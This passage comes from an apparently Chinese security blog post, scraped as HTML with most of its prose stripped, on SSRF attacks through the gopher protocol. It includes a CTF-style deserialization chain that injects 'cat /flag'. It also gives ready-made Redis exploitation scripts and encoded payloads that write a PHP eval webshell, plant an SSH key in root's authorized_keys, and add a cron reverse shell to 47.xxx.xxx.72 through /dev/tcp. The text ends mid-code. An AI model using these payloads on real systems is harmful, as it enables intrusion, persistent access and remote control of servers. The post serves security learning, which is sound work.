class=\"line\">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class=\"line\">result = &#x27;gopher://47.xxx.xxx.72:80/&#x27;+&#x27;\\_&#x27;+new</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202109.jpeg\"\n                        alt=\"image-20210113171513366\"\n                 ></p>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://47.xxx.xxx.72:80/\\_POST%20/echo.php%20HTTP/1.1%0D%0AHost%3A%2047.xxx.xxx.72%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2012%0D%0A%0D%0Awhoami%3DBunny%0D%0A</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598018_5fffc682e955f917dcc6e.png!small\"\n                        alt=\"image-20210113171641047\"\n                 ></p>\n<p>POSTHello Bunny</p>\n<p><strong>[2020 ]Web1</strong>GopherHTTP POSTSSRF</p>\n<h3 id=\"2020--Web1\"><a href=\"#2020--Web1\" class=\"headerlink\" title=\"[2020 ]Web1\"></a>[2020 ]Web1</h3><p></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202960.jpeg\"\n                        alt=\"image-20200921134331679\"\n                 ></p>\n<p>SSRFurl<code>file</code><code>ftp</code><code>127.0.0.1</code>tool.phpNot localhostssrftool.phppayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php  </span><br><span class=\"line\">class Welcome &#123;  </span><br><span class=\"line\">protected $url = &quot;http://127.0.0.1/tool.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">$poc = new Welcome;  </span><br><span class=\"line\">//echo serialize($poc);  </span><br><span class=\"line\">echo urlencode(serialize($poc));  </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Ftool.php%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">// O:7:&quot;Welcome&quot;:1:&#123;s:6:&quot;\\*url&quot;;s:25:&quot;http://127.0.0.1/tool.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Welcome12<code>__destruct()</code></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598020_5fffc684e27d96d0c30be.png!small\"\n                        alt=\"image-20200921134812338\"\n                 ></p>\n<p>tool.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#tool.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error\\_reporting(0);</span><br><span class=\"line\">$respect\\_show\\_ping = function($params) &#123;</span><br><span class=\"line\">   extract($params);</span><br><span class=\"line\">   $ip = isset($ip) ? $ip :&#x27;127.0.0.1&#x27;;</span><br><span class=\"line\">   system(&#x27;ping -c 1 &#x27;.$ip);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">if ($\\_SERVER\\[&quot;REMOTE\\_ADDR&quot;\\] !== &quot;127.0.0.1&quot;)&#123;</span><br><span class=\"line\">   echo &#x27;&lt;h2&gt;Not localhost!&lt;/h2&gt;&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else &#123;</span><br><span class=\"line\">   highlight\\_file(\\_\\_FILE\\_\\_);</span><br><span class=\"line\">   $respect\\_show\\_ping($\\_POST);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>tool.phpREMOTE_ADDR127.0.0.1REMOTE_ADDRIPIPtcpIPREMOTE_ADDRIPX-Forwarded-For</p>\n<p>REMOTE_ADDR127.0.0.1REMOTE_ADDRREMOTE_ADDR127.0.0.1X-Forwarded-ForSSRF</p>\n<p>index.phpSSRFgopherPOSTtool.phpREMOTE_ADDR127.0.0.1</p>\n<p>SSRFgopherPOST</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib.parse</span><br><span class=\"line\">test =\\\\</span><br><span class=\"line\">&quot;&quot;&quot;POST /tool.php HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 13</span><br><span class=\"line\"></span><br><span class=\"line\">ip=;cat /flag</span><br><span class=\"line\">&quot;&quot;&quot;  </span><br></pre></td></tr></table></figure>\n\n<p>#http</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tmp = urllib.parse.quote(test)</span><br><span class=\"line\">new = tmp.replace(&#x27;%0A&#x27;,&#x27;%0D%0A&#x27;)</span><br><span class=\"line\">result = &#x27;gopher://127.0.0.1:80/&#x27;+&#x27;\\_&#x27;+new</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<p>payloadHostgopherHost127.0.0.1</p>\n<p>gopherpayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A</span><br></pre></td></tr></table></figure>\n\n<p>exp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class Welcome &#123;</span><br><span class=\"line\">    protected $url = &quot;gopher://127.0.0.1:80/\\_POST%20/tool.php%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2013%0D%0A%0D%0Aip%3D%3Bcat%20/flag%0D%0A&quot;;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$poc = new Welcome;</span><br><span class=\"line\">//echo serialize($poc);</span><br><span class=\"line\">echo urlencode(serialize($poc));</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>payload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">O%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00url%22%3Bs%3A197%3A%22gopher%3A%2F%2F127.0.0.1%3A80%2F\\_POST%2520%2Ftool.php%2520HTTP%2F1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2Fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2Fflag%250D%250A%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>Welcome12<code>__destruct()</code></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202364.jpeg\"\n                        alt=\"image-20200921135622488\"\n                 ></p>\n<p></p>\n<p><strong></strong>POSTGETURLpayloadurl%20curl_execgopherURLpayloadURL</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher%3a%2f%2f127.0.0.1%3a80%2f\\_POST%2520%2ftool.php%2520HTTP%2f1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AContent-Type%253A%2520application%2fx-www-form-urlencoded%250D%250AContent-Length%253A%252013%250D%250A%250D%250Aip%253D%253Bcat%2520%2fflag%250D%250A</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"Redis\"><a href=\"#Redis\" class=\"headerlink\" title=\"Redis\"></a>Redis</h2><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598023_5fffc6877d72429d2cbae.png!small\"\n                        alt=\"20210113151633.png\"\n                 ></p>\n<p>RedisRedisRemote Dictionary Server )ANSI CKey-ValueAPI</p>\n<blockquote>\n<p><strong>Redis</strong></p>\n<p>Redis  0.0.0.0:6379 ip  Redis  Redis  Redis  Redis  Redis  config ssh &#x2F;root&#x2F;.ssh  authotrized_keys ssh</p>\n<p></p>\n<ul>\n<li><p>redis  0.0.0.0:6379ip</p>\n</li>\n<li><p>redis</p>\n</li>\n</ul>\n</blockquote>\n<p>SSRF6379RedisRedisGopherRedis Redis  config WebShellSSHShellRedisweb~&#x2F;.ssh&#x2F;var&#x2F;spool&#x2F;crondbfilenamesavebgsave</p>\n<p>RedisIP</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202356.jpeg\"\n                        alt=\"image-20210113190430425\"\n                 ></p>\n<p>IP192.168.52.1316379RedisUbuntuSSRF192.168.52.131Redis</p>\n<h3 id=\"WebShell\"><a href=\"#WebShell\" class=\"headerlink\" title=\"WebShell\"></a>WebShell</h3><p>redis</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall  </span><br><span class=\"line\">set 1 &#x27;&lt;?php eval($\\_POST\\[&quot;whoami&quot;\\]);?&gt;&#x27;  </span><br><span class=\"line\">config set dir /var/www/html  </span><br><span class=\"line\">config set dbfilename shell.php  </span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>Gopher~~~</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib</span><br><span class=\"line\">protocol=&quot;gopher://&quot;</span><br><span class=\"line\">ip=&quot;192.168.52.131&quot;</span><br><span class=\"line\">port=&quot;6379&quot;</span><br><span class=\"line\">shell=&quot;\\\\n\\\\n&lt;?php eval($\\_POST\\[\\\\&quot;whoami\\\\&quot;\\]);?&gt;\\\\n\\\\n&quot;</span><br><span class=\"line\">filename=&quot;shell.php&quot;</span><br><span class=\"line\">path=&quot;/var/www/html&quot;</span><br><span class=\"line\">passwd=&quot;&quot;</span><br><span class=\"line\">cmd=\\[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(shell.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t \\]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;</span><br><span class=\"line\">def redis\\_format(arr):</span><br><span class=\"line\">\tCRLF=&quot;\\\\r\\\\n&quot;</span><br><span class=\"line\">\tredis\\_arr = arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd=&quot;&quot;</span><br><span class=\"line\">\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))</span><br><span class=\"line\">\tfor x in redis\\_arr:</span><br><span class=\"line\">\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+=CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload += urllib.quote(redis\\_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>paylaod</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404252202688.jpeg\"\n                        alt=\"image-20210113175116867\"\n                 ></p>\n<p>payloadurlpayloadGETUbuntuSSRFpayload</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524\\_POST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>\n\n<p>192.168.52.131WebShell</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598027_5fffc68b3b060b67168e8.png!small\"\n                        alt=\"image-20210113185919592\"\n                 ></p>\n<h3 id=\"SSH\"><a href=\"#SSH\" class=\"headerlink\" title=\"SSH\"></a>SSH</h3><p>Redis<del>&#x2F;.sshSSH</del>&#x2F;.ssh</p>\n<p>redis</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall  </span><br><span class=\"line\">set 1 &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami  </span><br><span class=\"line\">&#x27;  </span><br><span class=\"line\">config set dir /root/.ssh/  </span><br><span class=\"line\">config set dbfilename authorized\\_keys  </span><br><span class=\"line\">save</span><br></pre></td></tr></table></figure>\n\n<p>Gopher</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import urllib</span><br><span class=\"line\">protocol=&quot;gopher://&quot;</span><br><span class=\"line\">ip=&quot;192.168.52.131&quot;</span><br><span class=\"line\">port=&quot;6379&quot;</span><br><span class=\"line\">ssh\\_pub=&quot;\\\\n\\\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E/45IEs/9a6AWfXb6iwzo+D62y8MOmt+sct27ZxGOcRR95FT6zrfFxqt2h56oLwml/Trxy5sExSQ/cvvLwUTWb3ntJYyh2eGkQnOf2d+ax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH/4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd/bWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ/NnHKyWtI/OzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe+XqQnjxtk4giopiFfRu8winE9scqlIA5Iu/d3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg/OOhoA3iKNhJ/JT31TU9E24dGh2Ei8K+PpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl+SOsVHpNqwFcrgsq/WR5BGqnu54vTTdJh0pSrl+tniHEnWWU= root@whoami\\\\n\\\\n&quot;</span><br><span class=\"line\">filename=&quot;authorized\\_keys&quot;</span><br><span class=\"line\">path=&quot;/root/.ssh/&quot;</span><br><span class=\"line\">passwd=&quot;&quot;</span><br><span class=\"line\">cmd=\\[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(ssh\\_pub.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t \\]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;</span><br><span class=\"line\">def redis\\_format(arr):</span><br><span class=\"line\">\tCRLF=&quot;\\\\r\\\\n&quot;</span><br><span class=\"line\">\tredis\\_arr = arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd=&quot;&quot;</span><br><span class=\"line\">\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))</span><br><span class=\"line\">\tfor x in redis\\_arr:</span><br><span class=\"line\">\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+=CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if \\_\\_name\\_\\_==&quot;\\_\\_main\\_\\_&quot;:</span><br><span class=\"line\">\tfor x in cmd:</span><br><span class=\"line\">\t\tpayload += urllib.quote(redis\\_format(x))</span><br><span class=\"line\">\tprint payload</span><br></pre></td></tr></table></figure>\n\n<p>payloadurlUbuntuSSRF</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssrf.php?url=gopher%3A%2F%2F192.168.52.131%3A6379%2F\\_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%2524568%250D%250A%250A%250Assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABgQDrCwrA1zAhmjeG6E%2F45IEs%2F9a6AWfXb6iwzo%252BD62y8MOmt%252Bsct27ZxGOcRR95FT6zrfFxqt2h56oLwml%2FTrxy5sExSQ%2FcvvLwUTWb3ntJYyh2eGkQnOf2d%252Bax2CVF8S6hn2Z0asAGnP3P4wCJlyR7BBTaka9QNH%2F4xsFDCfambjmYzbx9O2fzl8F67jsTq8BVZxy5XvSsoHdCtr7vxqFUd%2FbWcrZ5F1pEQ8tnEBYsyfMK0NuMnxBdquNVSlyQ%2FNnHKyWtI%2FOzzyfvtAGO6vf3dFSJlxwZ0aC15GOwJhjTpTMKq9jrRdGdkIrxLKe%252BXqQnjxtk4giopiFfRu8winE9scqlIA5Iu%2Fd3O454ZkYDMud7zRkSI17lP5rq3A1f5xZbTRUlxpa3Pcuolg%2FOOhoA3iKNhJ%2FJT31TU9E24dGh2Ei8K%252BPpT92dUnFDcmbEfBBQz7llHUUBxedy44Yl%252BSOsVHpNqwFcrgsq%2FWR5BGqnu54vTTdJh0pSrl%252BtniHEnWWU%253D%2520root%2540whoami%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252411%250D%250A%2Froot%2F.ssh%2F%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%252415%250D%250Aauthorized\\_keys%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</span><br></pre></td></tr></table></figure>\n\n<p>192.168.52.131SSH</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598028_5fffc68c0f8d37e46a560.png!small\"\n                        alt=\"image-20210113185745287\"\n                 ></p>\n<p>ssh</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://image.3001.net/images/20210114/1610598029_5fffc68d802a6e5c757d2.png!small\"\n                        alt=\"image-20210113193746288\"\n                 ></p>\n<h3 id=\"Shell\"><a href=\"#Shell\" class=\"headerlink\" title=\"Shell\"></a>Shell</h3><p><strong>Centos</strong></p>\n<p>redis</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flushall  </span><br><span class=\"line\">set 1 &#x27;\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1\\\\n\\\\n&#x27;  </span><br><span class=\"line\">config set dir /var/spool/cron/  </span><br><span class=\"line\">config set dbfilename root  </span><br><span class=\"line\">save  </span><br><span class=\"line\"></span><br><span class=\"line\">// 47.xxx.xxx.72vpsIP</span><br><span class=\"line\"></span><br><span class=\"line\">Gopher</span><br><span class=\"line\"></span><br><span class=\"line\">import urllib</span><br><span class=\"line\">protocol=&quot;gopher://&quot;</span><br><span class=\"line\">ip=&quot;192.168.52.131&quot;</span><br><span class=\"line\">port=&quot;6379&quot;</span><br><span class=\"line\">reverse\\_ip=&quot;47.xxx.xxx.72&quot;</span><br><span class=\"line\">reverse\\_port=&quot;2333&quot;</span><br><span class=\"line\">cron=&quot;\\\\n\\\\n\\\\n\\\\n\\*/1 \\* \\* \\* \\* bash -i &gt;&amp; /dev/tcp/%s/%s 0&gt;&amp;1\\\\n\\\\n\\\\n\\\\n&quot;%(reverse\\_ip,reverse\\_port)</span><br><span class=\"line\">filename=&quot;root&quot;</span><br><span class=\"line\">path=&quot;/var/spool/cron&quot;</span><br><span class=\"line\">passwd=&quot;&quot;</span><br><span class=\"line\">cmd=\\[&quot;flushall&quot;,</span><br><span class=\"line\">\t &quot;set 1 &#123;&#125;&quot;.format(cron.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),</span><br><span class=\"line\">\t &quot;config set dir &#123;&#125;&quot;.format(path),</span><br><span class=\"line\">\t &quot;config set dbfilename &#123;&#125;&quot;.format(filename),</span><br><span class=\"line\">\t &quot;save&quot;</span><br><span class=\"line\">\t \\]</span><br><span class=\"line\">if passwd:</span><br><span class=\"line\">\tcmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))</span><br><span class=\"line\">payload=protocol+ip+&quot;:&quot;+port+&quot;/\\_&quot;</span><br><span class=\"line\">def redis\\_format(arr):</span><br><span class=\"line\">\tCRLF=&quot;\\\\r\\\\n&quot;</span><br><span class=\"line\">\tredis\\_arr = arr.split(&quot; &quot;)</span><br><span class=\"line\">\tcmd=&quot;&quot;</span><br><span class=\"line\">\tcmd+=&quot;\\*&quot;+str(len(redis\\_arr))</span><br><span class=\"line\">\tfor x in redis\\_arr:</span><br><span class=\"line\">\t\tcmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class=\"line\">\tcmd+=CRLF</span><br><span class=\"line\">\treturn cmd</span><br><span class=\"line\"></span><br><span class=\"line\">if 